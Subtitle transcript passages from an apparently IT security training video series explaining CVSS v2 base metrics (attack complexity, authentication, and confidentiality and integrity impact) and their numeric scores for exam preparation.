--> 00:19:25.037\nFor medium, 0.610, and for low, 0.710.\n\n374\n00:19:25.037 --> 00:19:29.695\nAnd these are scores that as we look at\nthese and we get that, in other words, if\n\n375\n00:19:29.695 --> 00:19:34.797\nwe're asked to do the calculation, these\nare scores that you're gonna wanna know.\n\n376\n00:19:34.797 --> 00:19:40.501\nSo that when you look at\nthat CVSS of the vectors\n\n377\n00:19:40.501 --> 00:19:45.034\nthey give you, so if you see AVL ACM,\n\n378\n00:19:45.034 --> 00:19:50.990\nthen, what's it move onto after that?\n\n379\n00:19:50.990 --> 00:19:57.340\nAU, authentication is M and\n\n380\n00:19:57.340 --> 00:20:02.340\nthen C is C, I is C and A is C,\nwhat does that base score equal?\n\n381\n00:20:02.340 --> 00:20:04.810\nAnd they ask you to actually\ndo that calculation.\n\n382\n00:20:04.810 --> 00:20:06.620\nYou need to be able to\nknow these scores so\n\n383\n00:20:06.620 --> 00:20:08.365\nthat you can actually do that calculation.\n\n384\n00:20:08.365 --> 00:20:12.295\nCuz without knowing that,\nyou won't be able to correct a score.\n\n385\n00:20:12.295 --> 00:20:16.815\nSo it's important that you\nremember these scores.\n\n386\n00:20:16.815 --> 00:20:19.300\nSo high, medium, low, let's talk about\nit really quickly, what does that mean?\n\n387\n00:20:19.300 --> 00:20:24.160\nThat means attack complexity is high,\nthis is a very\n\n388\n00:20:24.160 --> 00:20:28.850\ncomplex piece of maybe\nproof-of-concept code.\n\n389\n00:20:28.850 --> 00:20:32.149\nIt's not just an easy script\nyou found on the Internet.\n\n390\n00:20:32.149 --> 00:20:36.365\nAnd you double-click,\nyou point it towards your attack, or\n\n391\n00:20:36.365 --> 00:20:39.720\nyour vulnerable machine and attack it.\n\n392\n00:20:39.720 --> 00:20:42.990\nAnd it goes, there you go, you're in,\nand anybody and their brother can do it.\n\n393\n00:20:42.990 --> 00:20:45.130\nThis would be very complex.\n\n394\n00:20:45.130 --> 00:20:48.740\nSomebody would have to know\na lot about this technology for\n\n395\n00:20:48.740 --> 00:20:50.880\nthem to be able to pull this attack off,\nokay?\n\n396\n00:20:50.880 --> 00:20:51.660\nSo that's high.\n\n397\n00:20:53.850 --> 00:20:58.493\nSpecialized conditions is the term\nthey like to use in the CVSS.\n\n398\n00:20:58.493 --> 00:21:02.560\nSo if you see specialized conditions,\nthat's an important thing.\n\n399\n00:21:02.560 --> 00:21:06.046\nAttacker requires something like\nelevated privileges to exploit.\n\n400\n00:21:06.046 --> 00:21:10.995\nRight, so wow, they've already\ngotten access to the system.\n\n401\n00:21:10.995 --> 00:21:14.572\nAnd raised their privileges up\nto administrative levels, or\n\n402\n00:21:14.572 --> 00:21:18.690\nlevels that would be good enough for\nme to pull this attack off.\n\n403\n00:21:18.690 --> 00:21:20.270\nSo they're already\nshowing their skill set,\n\n404\n00:21:20.270 --> 00:21:24.800\nand able to gain access to\nsystems unauthorized access.\n\n405\n00:21:24.800 --> 00:21:28.480\nSuspicious social engineering\nattacks might be required\n\n406\n00:21:28.480 --> 00:21:29.770\nto pull something like this off.\n\n407\n00:21:31.670 --> 00:21:34.785\nAnd when I say suspicious\nsocial engineering attacks,\n\n408\n00:21:34.785 --> 00:21:39.498\nI mean it would be kinda blatant that you\nare looking, why are you asking questions?\n\n409\n00:21:39.498 --> 00:21:44.448\nEven a low level, someone that's very\nuntechnical would be curious at why\n\n410\n00:21:44.448 --> 00:21:47.760\nyou're asking this specific\nkind of questions.\n\n411\n00:21:47.760 --> 00:21:51.290\nWhy are you asking for\naccess to this specific area,\n\n412\n00:21:51.290 --> 00:21:55.530\nonly these people would ever need that.\n\n413\n00:21:55.530 --> 00:21:57.783\nSo your social engineering,\n\n414\n00:21:57.783 --> 00:22:02.739\nif you had to perform some social\nengineering attack, would be so\n\n415\n00:22:02.739 --> 00:22:08.430\nblatant that it would make this very,\nvery difficult to pull off, right?\n\n416\n00:22:08.430 --> 00:22:09.286\nLet's see here,\n\n417\n00:22:09.286 --> 00:22:12.870\nare the vulnerable conditions\nare rarely seen in the wild, right?\n\n418\n00:22:12.870 --> 00:22:17.204\nIt's the moon and\nthe stars align kind of thing, and\n\n419\n00:22:17.204 --> 00:22:20.364\nyou just happen to stumble across it.\n\n420\n00:22:20.364 --> 00:22:25.220\nBut if you did, it would be very difficult\nto exploit, right, so that's why high.\n\n421\n00:22:25.220 --> 00:22:28.344\nMedium is somewhat specialized conditions,\n\n422\n00:22:28.344 --> 00:22:31.634\nusing that terminology,\nrequired to exploit.\n\n423\n00:22:31.634 --> 00:22:38.839\nAttacker is limited to systems or\nusers requiring some authorization, right?\n\n424\n00:22:38.839 --> 00:22:40.752\nOr they're limited by that,\n\n425\n00:22:40.752 --> 00:22:45.450\nthey have some authorization necessary\nto pull off the attack, right?\n\n426\n00:22:45.450 --> 00:22:46.210\nWhat else?\n\n427\n00:22:46.210 --> 00:22:48.672\nVulnerable config is not default.\n\n428\n00:22:48.672 --> 00:22:56.228\nSo yeah, maybe you found a configuration\nfile, and it's not just admin-admin.\n\n429\n00:22:56.228 --> 00:22:59.090\nThe defaults have been changed,\nthe configuration is custom.\n\n430\n00:22:59.090 --> 00:23:03.763\nIt's not just the out-of-the-box,\nfire-and-forget kind of configuration.\n\n431\n00:23:03.763 --> 00:23:06.706\nThey've actually set some time\ninto working with it, and\n\n432\n00:23:06.706 --> 00:23:09.440\nnow you have to kind of\nmeander around that.\n\n433\n00:23:09.440 --> 00:23:14.400\nIncreasing the complexity, but\nnot making it as difficult as high, right?\n\n434\n00:23:14.400 --> 00:23:15.627\nAnything else?\n\n435\n00:23:15.627 --> 00:23:18.766\nYeah, the social engineering, if you were\nto having to use social engineering,\n\n436\n00:23:18.766 --> 00:23:21.499\nyour lower level people would not\nprobably catch on that you're social\n\n437\n00:23:21.499 --> 00:23:22.290\nengineering them.\n\n438\n00:23:22.290 --> 00:23:25.645\nBut anyone with a technical\nbackground would probably say,\n\n439\n00:23:25.645 --> 00:23:28.720\nhm, why would you need that?\n\n440\n00:23:28.720 --> 00:23:31.710\nThat doesn't seem right that\nyou'd wanna do that, right?\n\n441\n00:23:31.710 --> 00:23:34.155\nSo you've gotta start gauging\nyour audience at this point.\n\n442\n00:23:34.155 --> 00:23:36.360\nRight, and your social engineering time.\n\n443\n00:23:36.360 --> 00:23:41.170\n&gt;&gt; So, just a quick question,\nthe 0.710 seems higher than the 0.395.\n\n444\n00:23:41.170 --> 00:23:41.848\n&gt;&gt; Yes.\n\n445\n00:23:41.848 --> 00:23:43.140\n&gt;&gt; What's going on with that?\n\n446\n00:23:43.140 --> 00:23:47.269\n&gt;&gt; Yeah, again, okay, so this is just like\nthe weird logic of how this stuff works.\n\n447\n00:23:47.269 --> 00:23:53.625\nBecause it's easy to pull off if it's low,\nit garners a higher criticality score.\n\n448\n00:23:53.625 --> 00:23:55.510\n&gt;&gt; Okay.\n&gt;&gt; Right, it's a higher severity.\n\n449\n00:23:55.510 --> 00:24:00.223\nSo because it's easy to do, anybody can do\nit, it's more severe because it's easy,\n\n450\n00:24:00.223 --> 00:24:00.880\nall right?\n\n451\n00:24:00.880 --> 00:24:04.830\nSo that's why the score goes lower\nas the complexity gets higher.\n\n452\n00:24:04.830 --> 00:24:06.750\nIf the complexity is\nhigh it's difficult and\n\n453\n00:24:06.750 --> 00:24:07.910\nit's unlikely that someone pull it off.\n\n454\n00:24:07.910 --> 00:24:09.500\nTherefore it's less severe.\n\n455\n00:24:09.500 --> 00:24:10.680\n&gt;&gt; Ha.\n\n456\n00:24:10.680 --> 00:24:11.870\n&gt;&gt; Said the blind man.\n\n457\n00:24:11.870 --> 00:24:12.621\nSo I see.\n[CROSSTALK]\n\n458\n00:24:12.621 --> 00:24:14.349\n&gt;&gt; There's a method to the madness.\n\n459\n00:24:14.349 --> 00:24:18.500\n&gt;&gt; Exactly, so\nthat's why this is kind of like backwards\n\n460\n00:24:18.500 --> 00:24:20.420\nZack I understand cause I\nthought the same thing.\n\n461\n00:24:20.420 --> 00:24:22.080\nI was like it's weird it's going back.\n\n462\n00:24:22.080 --> 00:24:25.140\nIt's not backwards,\nI've got to think of it in the right way.\n\n463\n00:24:25.140 --> 00:24:28.170\n&gt;&gt; Right.\n&gt;&gt; Which is in terms of severity,\n\n464\n00:24:28.170 --> 00:24:34.250\nlow which means it requires little\nto no expertise at all, right.\n\n465\n00:24:34.250 --> 00:24:39.260\nNo specialized conditions, right is that\nwhat it was is, no yeah no specialized\n\n466\n00:24:39.260 --> 00:24:44.630\nconditions are required to exploit,\nthis is a very easy exploit which will be,\n\n467\n00:24:44.630 --> 00:24:50.170\nit allows untrusted or\nunauthorized access.\n\n468\n00:24:50.170 --> 00:24:53.690\nI'll give you an example\nanonymous FTP login.\n\n469\n00:24:53.690 --> 00:24:58.680\nIf I was able to use anonymous FTP,\njust type in anonymous as the username,\n\n470\n00:24:58.680 --> 00:25:01.320\nanonymous as the password and I am in.\n\n471\n00:25:01.320 --> 00:25:04.110\nAnd then I am able to pivot\nthere into another attack.\n\n472\n00:25:04.110 --> 00:25:07.760\nThat would be easier if I was able\nto attack the server through that or\n\n473\n00:25:07.760 --> 00:25:12.290\nif I found a login page to a web app and\nall it was,\n\n474\n00:25:12.290 --> 00:25:14.340\nwas blank, blank for\nusername and password.\n\n475\n00:25:14.340 --> 00:25:19.030\nOr it was defaults, and\nI was able to log in, so I found a router,\n\n476\n00:25:19.030 --> 00:25:21.500\nand I wanted to long into it.\n\n477\n00:25:21.500 --> 00:25:25.970\nAnd it's Cisco or Linksys, whatever,\nI look that up on the internet,\n\n478\n00:25:25.970 --> 00:25:30.710\nfind the default user and a password, and\nthen type that in, and I'm in, right?\n\n479\n00:25:30.710 --> 00:25:36.000\nSo little to no kind of road blocks to\nstopping someone from gaining access to it\n\n480\n00:25:36.000 --> 00:25:38.200\nwould be in the low spectrum.\n\n481\n00:25:38.200 --> 00:25:40.120\nWhat else?\nDefault configurations are found,\n\n482\n00:25:40.120 --> 00:25:40.990\njust like that.\n\n483\n00:25:40.990 --> 00:25:43.150\nNo one has changed the user name or\npassword.\n\n484\n00:25:43.150 --> 00:25:45.320\nThe IP addresses are all\nfrom the defaults.\n\n485\n00:25:45.320 --> 00:25:46.880\nThe configuration is all the defaults.\n\n486\n00:25:46.880 --> 00:25:48.160\nYou know where everything is.\n\n487\n00:25:48.160 --> 00:25:50.530\nThey've handed you a road map.\n\n488\n00:25:50.530 --> 00:25:55.210\nTo the entirety of how this is\nworking inside of their environments.\n\n489\n00:25:55.210 --> 00:25:57.490\nAnd that's no bueno.\n\n490\n00:25:57.490 --> 00:25:58.210\n&gt;&gt; No bueno.\n\n491\n00:25:58.210 --> 00:26:00.330\n&gt;&gt; Right, no good.\n\n492\n00:26:00.330 --> 00:26:01.700\nOr it can be performed manually.\n\n493\n00:26:01.700 --> 00:26:06.300\nYou don't even need an automated tool to,\nsome cool script that you have access to.\n\n494\n00:26:06.300 --> 00:26:09.450\nOr some penetration testing tool\nthat's available on the internet,\n\n495\n00:26:09.450 --> 00:26:09.950\nand you can use it.\n\n496\n00:26:09.950 --> 00:26:11.040\nYou don't even need to go that way.\n\n497\n00:26:11.040 --> 00:26:15.380\nYou can just kind of go at it and\ntype some things or\n\n498\n00:26:15.380 --> 00:26:18.800\ngain access to you type SSH to it, and\nit's like hey, welcome to the show.\n\n499\n00:26:18.800 --> 00:26:23.803\nThere was no nothing, it was so\neasy even a caveman can do it, right?\n\n500\n00:26:23.803 --> 00:26:27.690\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Requires little to no advance\n\n501\n00:26:27.690 --> 00:26:30.130\nskills, basically is what\nwe're talking about here.\n\n502\n00:26:30.130 --> 00:26:33.510\nSo even the newbies to computer\nsecurity that are out there going,\n\n503\n00:26:33.510 --> 00:26:36.965\nI'm gonna be a hacker, it's gonna be\nawesome, and I'm gonna steal stuff.\n\n504\n00:26:36.965 --> 00:26:38.920\n&gt;&gt; [LAUGH]\n&gt;&gt; And things of that nature,\n\n505\n00:26:38.920 --> 00:26:42.600\nthey would be able to successfully\npull off these low attacks.\n\n506\n00:26:42.600 --> 00:26:46.410\nSo if you see these on your network,\nyou're definately gonna wanna handle that\n\n507\n00:26:46.410 --> 00:26:50.570\nbusiness because, you're basically\nleaving yourself wide open for an attack.\n\n508\n00:26:50.570 --> 00:26:53.260\nNow we have a few more\nvectors to get through.\n\n509\n00:26:53.260 --> 00:26:53.940\n&gt;&gt; Vectors.\n\n510\n00:26:53.940 --> 00:26:55.690\n&gt;&gt; But we have very little\ntime in which to do that.\n\n511\n00:26:55.690 --> 00:26:58.470\nSo, Zach, as I predicted,\nlooks like we're headed to that part two.\n\n512\n00:26:58.470 --> 00:27:01.900\n&gt;&gt; Well, Daniel, thank you cuz you're\nhelping us become cybersleuths.\n\n513\n00:27:01.900 --> 00:27:02.600\nThat's a good one.\n\n514\n00:27:02.600 --> 00:27:03.760\n&gt;&gt; Yes, I like that.\n\n515\n00:27:03.760 --> 00:27:05.860\n&gt;&gt; You can mark that one down,\ncybersleuths.\n\n516\n00:27:05.860 --> 00:27:10.360\nAnd vulnerability management CVSS\npart one there will be a part two,\n\n517\n00:27:10.360 --> 00:27:12.320\nbefore we move on,\nanything else you'd like to say?\n\n518\n00:27:12.320 --> 00:27:16.320\n&gt;&gt; No, just you definitely need\nto make sure that you understand,\n\n519\n00:27:16.320 --> 00:27:20.500\nif someone asks you what AV is, what\nthat means, what their attributes are.\n\n520\n00:27:20.500 --> 00:27:22.382\nSo this is flashcard city in my book.\n\n521\n00:27:22.382 --> 00:27:25.000\n&gt;&gt; Mm-hm [INAUDIBLE] is a great series,\n\n522\n00:27:25.000 --> 00:27:28.090\nDaniel's done a great job putting\nall these episodes together for you.\n\n523\n00:27:28.090 --> 00:27:31.530\nMake sure you watch every single one,\nand you'll be in the course library,\n\n524\n00:27:31.530 --> 00:27:34.480\nthere's thousands of other videos\nthere designed to do one thing,\n\n525\n00:27:34.480 --> 00:27:36.310\nhelp you go further,\nso check those out too.\n\n526\n00:27:36.310 --> 00:27:38.485\nAnd tell everybody you\nknow about ITPRO.TV.\n\n527\n00:27:38.485 --> 00:27:41.600\nITPRO.TV is binge worthy,\nthanks for watching, I'm Zach

Good to back, Mr. Zachary.\n\n14\n00:00:34.900 --> 00:00:38.110\nWe are continuing on with the whole CVSS\n\n15\n00:00:38.110 --> 00:00:40.050\ninteresting little road\nthe we've gone down.\n\n16\n00:00:40.050 --> 00:00:43.310\nWe've only gone part of the way though,\nwe stopped to take a pit stop,\n\n17\n00:00:43.310 --> 00:00:45.940\nget some food in us, have drink,\na little bit of a rest.\n\n18\n00:00:45.940 --> 00:00:50.640\nAnd now we're back to jump back in to\nfray with CVSS, what does it stand for?\n\n19\n00:00:50.640 --> 00:00:53.370\nCommon Vulnerability Scoring System,\ndon't forget that.\n\n20\n00:00:53.370 --> 00:00:58.330\nAnd we're looking at the different\nvectors that make up the base score.\n\n21\n00:00:58.330 --> 00:01:02.190\nSo we've gone through, well actually\nwe've gone through the attack vector,\n\n22\n00:01:02.190 --> 00:01:03.370\nwe've looked at those.\n\n23\n00:01:03.370 --> 00:01:05.670\nWe've looked at also\nthe attack complexity.\n\n24\n00:01:05.670 --> 00:01:08.350\nAnd now it's time to\nmove into authentication,\n\n25\n00:01:08.350 --> 00:01:12.710\nwhich is the AU vector for\nyour CVSS score.\n\n26\n00:01:12.710 --> 00:01:15.970\n&gt;&gt; As we continue on learning\nhow to be cyber sleuths\n\n27\n00:01:15.970 --> 00:01:18.080\nwith Daniel Lowrie's tutelage.\n\n28\n00:01:18.080 --> 00:01:21.460\n&gt;&gt; We're trying,\nthat's the name of the game, anyway.\n\n29\n00:01:21.460 --> 00:01:24.070\nSo without further ado,\nlet's go ahead and get back into it,\n\n30\n00:01:24.070 --> 00:01:26.860\nand see what we can learn about the AU or\n\n31\n00:01:26.860 --> 00:01:32.430\nauthentication portion of the attack\nvectors, or the vectors for CVSS.\n\n32\n00:01:32.430 --> 00:01:36.940\nLet me bring that up, I've made\nthese wonderful slides for us all so\n\n33\n00:01:36.940 --> 00:01:37.790\nwe can see this.\n\n34\n00:01:37.790 --> 00:01:40.770\nGet it nice and large for\nyou, so let's take a look.\n\n35\n00:01:40.770 --> 00:01:44.430\nWe've got, again, always this seems to\nbe a trend here with the three different\n\n36\n00:01:46.140 --> 00:01:48.140\nattributes of the vector.\n\n37\n00:01:48.140 --> 00:01:51.230\nSo that's a good thing for us,\ncuz it's easier for us to remember.\n\n38\n00:01:51.230 --> 00:01:53.860\nWell, there's only gonna be three,\nnow I've gotta remember those three.\n\n39\n00:01:53.860 --> 00:01:55.783\nAnd in this three we have multiple,\nsingle, and none.\n\n40\n00:01:55.783 --> 00:01:57.640\nSo what do you mean?\n\n41\n00:01:57.640 --> 00:02:04.280\nBasically, how many authentication\nroadblocks must we jump over,\n\n42\n00:02:04.280 --> 00:02:09.105\nmust we hurdle to successfully\nexploit a vulnerability?\n\n43\n00:02:09.105 --> 00:02:11.635\nLeap, yes, like a gazelle.\n\n44\n00:02:11.635 --> 00:02:12.285\n&gt;&gt; Yes.\n\n45\n00:02:12.285 --> 00:02:16.715\n&gt;&gt; Where you say authentication vector,\nwe jumped through that hoop.\n\n46\n00:02:16.715 --> 00:02:17.845\nThere's another one,\n\n47\n00:02:17.845 --> 00:02:21.645\nI did a jump through that,\nwho keeps putting up these roadblocks?\n\n48\n00:02:21.645 --> 00:02:24.854\nSo is it multiple,\nthat's what we see with multiple.\n\n49\n00:02:24.854 --> 00:02:29.172\nSo with multiple, the attacker\nmust authenticate two times or\n\n50\n00:02:29.172 --> 00:02:33.990\nmore before they're able to\nsuccessfully exploit a vulnerability.\n\n51\n00:02:33.990 --> 00:02:38.836\nSo that's the M, so\nthat means it's really, it's kinda hard,\n\n52\n00:02:38.836 --> 00:02:40.871\nit's not easy for them to.\n\n53\n00:02:40.871 --> 00:02:44.831\nBecause there's a lot of\nauthentication mechanisms they have to\n\n54\n00:02:44.831 --> 00:02:49.390\nget through before they're able to\nget at the system that they need.\n\n55\n00:02:49.390 --> 00:02:54.846\nSo it garners a lower score, which is\nthat of 0.450 for you keeping score.\n\n56\n00:02:54.846 --> 00:02:59.445\nMoving on to single,\nI'm gonna give you three guesses, Zack,\n\n57\n00:02:59.445 --> 00:03:03.390\non what single means when\nit comes to authentication.\n\n58\n00:03:03.390 --> 00:03:05.150\n&gt;&gt; One, one attack.\n\n59\n00:03:05.150 --> 00:03:08.820\n&gt;&gt; You know what, you would think\nthat that would be right, and it is.\n\n60\n00:03:08.820 --> 00:03:10.139\nBecause it is single, it is one.\n\n61\n00:03:10.139 --> 00:03:10.984\n[LAUGH] You have to authenticate.\n\n62\n00:03:10.984 --> 00:03:12.779\n&gt;&gt; You had me going.\n&gt;&gt; Yeah I know, I had him good,\n\n63\n00:03:12.779 --> 00:03:15.267\nyou should see, he was like-\n&gt;&gt; I was sweating.\n\n64\n00:03:15.267 --> 00:03:20.320\n&gt;&gt; You know, though,\nwe can never tell with IT, right?\n\n65\n00:03:20.320 --> 00:03:23.609\nYes, single, a single time for\nevery time you have to authenticate.\n\n66\n00:03:23.609 --> 00:03:25.240\nWe have some weird\nterminology we come up with.\n\n67\n00:03:25.240 --> 00:03:29.943\nBut no, this is just a single time, just\nlike Zach said, that you must authenticate\n\n68\n00:03:29.943 --> 00:03:33.939\nbefore you're successfully able to\ncomplete the attack, all right?\n\n69\n00:03:33.939 --> 00:03:39.810\nAnd then none, obviously, didn't give\nthe score, the score for single, 0.560.\n\n70\n00:03:39.810 --> 00:03:42.560\nGet that buried in your brain,\n0.560 for the single.\n\n71\n00:03:42.560 --> 00:03:44.522\nMoving onto the none,\nwhich means there is no authentication.\n\n72\n00:03:44.522 --> 00:03:48.466\nThere are no hurdles to jump through,\nit's just there, access me,\n\n73\n00:03:48.466 --> 00:03:51.410\nI'm here for you,\ntrying to make things easy.\n\n74\n00:03:51.410 --> 00:03:52.599\nIt's interesting,\n\n75\n00:03:52.599 --> 00:03:56.170\nauthentication mechanisms\nare a security mechanism, right?\n\n76\n00:03:56.170 --> 00:04:00.470\nAnd if you think about it,\nyou notice that when you have ease of,\n\n77\n00:04:00.470 --> 00:04:04.020\nit's like a scale,\nit's like Lady Justice, right?\n\n78\n00:04:04.020 --> 00:04:05.380\nShe's got the scales in her hand.\n\n79\n00:04:05.380 --> 00:04:09.250\nAnd when you start piling\non ease of operability,\n\n80\n00:04:09.250 --> 00:04:10.970\nwell guess what's on the other side?\n\n81\n00:04:10.970 --> 00:04:14.420\nSecurity, it usually does this, right?\n\n82\n00:04:14.420 --> 00:04:18.283\nSo ease of, or I guess it's the other way,\nI guess this would be ease making it\n\n83\n00:04:18.283 --> 00:04:20.854\nheavy, security goes the opposite,\nit gets lax.\n\n84\n00:04:20.854 --> 00:04:24.620\nCuz security makes things more difficult,\nmore security counter measures and\n\n85\n00:04:24.620 --> 00:04:26.363\nimplementations that we work with,\n\n86\n00:04:26.363 --> 00:04:29.810\nthe more difficult it is to work with\nthe system, but it's more secure.\n\n87\n00:04:30.930 --> 00:04:35.451\nWhereas if I start making things easy, I\nask for no authentication, I'm asking for\n\n88\n00:04:35.451 --> 00:04:37.183\nsomeone to get into my network.\n\n89\n00:04:37.183 --> 00:04:41.480\nBecause I've basically opened the door,\nleft the keys on the hook,\n\n90\n00:04:41.480 --> 00:04:44.680\nwrote a sign,\nput a $100 bill on the door knob.\n\n91\n00:04:45.770 --> 00:04:47.730\n&gt;&gt; This is not a good thing to do.\n&gt;&gt; Please come in, yes.\n\n92\n00:04:47.730 --> 00:04:49.706\n&gt;&gt; Not a good thing.\n&gt;&gt; Not a good idea, but it does happen,\n\n93\n00:04:49.706 --> 00:04:51.194\nand we definitely wanna know that.\n\n94\n00:04:51.194 --> 00:04:56.299\nSo when we see that AU vector in our CVSS,\nand we see colon N,\n\n95\n00:04:56.299 --> 00:05:03.042\nthat's well we've got something here and\nit requires no authentication\n\n96\n00:05:03.042 --> 00:05:09.230\nat all before someone can access this and\nperform this attack.\n\n97\n00:05:09.230 --> 00:05:14.397\nWe might need to look at that, and\nit gets a pretty high score of 0.704.\n\n98\n00:05:14.397 --> 00:05:17.265\nBut that's authentication,\nmake sure I'm not forgetting anything.\n\n99\n00:05:17.265 --> 00:05:23.080\nI think that's about it, when it comes\nto that, pretty straightforward, right?\n\n100\n00:05:23.080 --> 00:05:24.340\nLet's move on, let's move on.\n\n101\n00:05:25.816 --> 00:05:29.690\nClose that down, here, let's go ahead and\nstart with the C, the I, and the A.\n\n102\n00:05:29.690 --> 00:05:31.590\nLet's move through those,\ncuz those are important.\n\n103\n00:05:31.590 --> 00:05:33.690\nThe good news is is hopefully\nyou're already familiar with that.\n\n104\n00:05:33.690 --> 00:05:37.460\nIf you've passed through security\nplus type of information before,\n\n105\n00:05:37.460 --> 00:05:41.200\nwhich should be kind of a prerequisite\nknowledge at the CISA level.\n\n106\n00:05:41.200 --> 00:05:45.280\nYou know confidentiality, integrity, and\navailability, what they mean, right?\n\n107\n00:05:45.280 --> 00:05:46.850\nSo let's bring that up.\n\n108\n00:05:46.850 --> 00:05:53.060\nConfidentiality is going to\ngive us the idea of the impact\n\n109\n00:05:53.060 --> 00:05:57.820\nto the confidentiality of the data or\nthe system that has been attacked right?\n\n110\n00:05:57.820 --> 00:06:04.520\nHow devastating has that been, is it none,\npartial, or complete as far as its impact?\n\n111\n00:06:05.620 --> 00:06:07.161\nIf it's none, we get a 0 score.\n\n112\n00:06:07.161 --> 00:06:08.317\n&gt;&gt; Bing, bing bing.\n\n113\n00:06:08.317 --> 00:06:11.893\n&gt;&gt; Right, so if the confidentiality,\nmeaning that the people that\n\n114\n00:06:11.893 --> 00:06:15.540\nare supposed to have access are still\nthe people that have access.\n\n115\n00:06:15.540 --> 00:06:22.600\nNo unauthorized viewing of\nthe data has been accomplished.\n\n116\n00:06:22.600 --> 00:06:23.600\nThen, there you go,\n\n117\n00:06:23.600 --> 00:06:27.570\nyou get a score of 0, because there\nhas been no confidentiality breach.\n\n118\n00:06:27.570 --> 00:06:30.506\nRight, it hasn't been disseminated\nto the wild, and here you go,\n\n119\n00:06:30.506 --> 00:06:31.700\nhere's the information.\n\n120\n00:06:32.930 --> 00:06:35.704\nIs still under lock and\nkey as it should be, so\n\n121\n00:06:35.704 --> 00:06:38.114\ntherefore you get a 0 score with that.\n\n122\n00:06:38.114 --> 00:06:43.320\nPartial, and it's interesting how they\ncome up with the idea of partial.\n\n123\n00:06:43.320 --> 00:06:47.662\nAccess to data is possible, but\nthe attacker can't control what it is\n\n124\n00:06:47.662 --> 00:06:51.499\nthey're able to see, right,\nwhat they're able to access.\n\n125\n00:06:51.499 --> 00:06:54.921\nSo they're basically\ntaking what they can get,\n\n126\n00:06:54.921 --> 00:07:00.400\nthey've found a vulnerability,\nthey've exploited said vulnerability.\n\n127\n00:07:00.400 --> 00:07:02.278\nIt has given them access to data, but\n\n128\n00:07:02.278 --> 00:07:05.982\nthey weren't able to direct what data\nthey were able to access, right?\n\n129\n00:07:05.982 --> 00:07:12.632\nWhat were they able to see and exfiltrate\nfrom your from your environment?\n\n130\n00:07:12.632 --> 00:07:16.170\nOkay, so they have partial, but\nthey can't control what goes on there.\n\n131\n00:07:17.310 --> 00:07:20.992\nThis is the idea of maybe you\nhave access to a database, right,\n\n132\n00:07:20.992 --> 00:07:23.950\nyou've done a SQL exploit of some sort.\n\n133\n00:07:23.950 --> 00:07:27.755\nI've accessed the database but\nI can only access some of the tables and\n\n134\n00:07:27.755 --> 00:07:28.670\nnot all of them.\n\n135\n00:07:28.670 --> 00:07:31.020\nOkay, that idea.\n\n136\n00:07:31.020 --> 00:07:32.600\nAgain, attacker can take what they get.\n\n137\n00:07:32.600 --> 00:07:37.498\nThe score here, 0.275,\nfor your crib sheets.\n\n138\n00:07:37.498 --> 00:07:41.817\nAnd then complete, which means\nthat not only does the attacker,\n\n139\n00:07:41.817 --> 00:07:46.701\nare they able to exploit the system and\ngain access to unauthorized data.\n\n140\n00:07:46.701 --> 00:07:51.182\nBut they're able to direct and\ncontrol what it is they're accessing,\n\n141\n00:07:51.182 --> 00:07:55.001\nbasically full system compromise\nof the confidentiality.\n\n142\n00:07:55.001 --> 00:07:56.972\nOf the system at hand.\n\n143\n00:07:56.972 --> 00:07:58.531\nOkay, unload the data.\n\n144\n00:07:58.531 --> 00:07:59.793\nSo a very, very bad thing.\n\n145\n00:07:59.793 --> 00:08:00.482\n&gt;&gt; Mm-hm.\n\n146\n00:08:00.482 --> 00:08:01.331\n&gt;&gt; [LAUGH] If you see a C:C,\nman we need to look at this real quick.\n\n147\n00:08:01.331 --> 00:08:06.888\nBecause if someone is\nsuccessfully able to,\n\n148\n00:08:06.888 --> 00:08:12.310\nand again, these all kinda come into play.\n\n149\n00:08:12.310 --> 00:08:13.140\nThey work against each other.\n\n150\n00:08:13.140 --> 00:08:15.532\nWe'll talk about prioritization\nin a little bit, but\n\n151\n00:08:15.532 --> 00:08:17.710\nhere I just wanted to\nmake sure that you know.\n\n152\n00:08:17.710 --> 00:08:20.220\nThat C is the big deal.\n\n153\n00:08:20.220 --> 00:08:22.340\nSo you see CC, no bueno.\n\n154\n00:08:22.340 --> 00:08:23.910\n&gt;&gt; I'd say those numbers make sense.\n\n155\n00:08:23.910 --> 00:08:25.780\nThe 0.660, that's a higher number.\n\n156\n00:08:25.780 --> 00:08:27.330\nThat absolutely makes sense.\n\n157\n00:08:27.330 --> 00:08:28.285\n&gt;&gt; Yeah, now hopefully.\n\n158\n00:08:28.285 --> 00:08:30.343\n&gt;&gt; Yeah.\n&gt;&gt; I like it when they make sense.\n\n159\n00:08:30.343 --> 00:08:33.245\nYou don't have to do some weird reverse\nlogic and throw your brain out of whack.\n\n160\n00:08:33.245 --> 00:08:34.992\n&gt;&gt; Correct.\n&gt;&gt; Very, very straightforward,\n\n161\n00:08:34.992 --> 00:08:36.473\nvery, very simple, all right.\n\n162\n00:08:36.473 --> 00:08:40.388\n&gt;&gt; Confidentiality, hopefully I think\nwe're all squared away on that.\n\n163\n00:08:40.388 --> 00:08:43.140\nC, total disclosure, so bad.\n\n164\n00:08:43.140 --> 00:08:44.140\nNo, no need for that.\n\n165\n00:08:44.140 --> 00:08:45.168\nAll right, let's go to Integrity.\n\n166\n00:08:45.168 --> 00:08:52.960\nIntegrity is,\nhas the data been modified at all.\n\n167\n00:08:54.480 --> 00:09:00.700\nIf I were able to come in and modify data,\nto what extent am I able to modify data?\n\n168\n00:09:00.700 --> 00:09:02.810\nAnd again, we have none,\npartial, and complete.\n\n169\n00:09:02.810 --> 00:09:06.540\nThe good news about C and the I and the A,\nwhen it comes to the attack vectors in\n\n170\n00:09:06.540 --> 00:09:11.510\nyour CVSS scoring system is that,\ngreat news is that they're all the same.\n\n171\n00:09:11.510 --> 00:09:16.050\nThey're all none, partial, and complete,\nand the scores are all the same as well.\n\n172\n00:09:16.050 --> 00:09:20.490\nSo that makes it so much easier, for if\nyou've memorized one, you've memorized all\n\n173\n00:09:20.490 --> 00:09:25.716\nof them, as far as their attributes and\ntheir scoring system goes, okay?\n\n174\n00:09:25.716 --> 00:09:28.504\nAs far as like we didn't know\nwhat confidentiality means,\n\n175\n00:09:28.504 --> 00:09:31.683\nyou know what integrity means,\nyou know what availability means,\n\n176\n00:09:31.683 --> 00:09:33.050\nas far as CVSS is concerned.\n\n177\n00:09:33.050 --> 00:09:35.901\nBut other than that,\nyou'd have everything else down path.\n\n178\n00:09:35.901 --> 00:09:39.399\nAnd again, still very similar when it\ncomes to confidentiality, integrity and\n\n179\n00:09:39.399 --> 00:09:41.196\navailability and their definitions\n&gt;&gt; And\n\n180\n00:09:41.196 --> 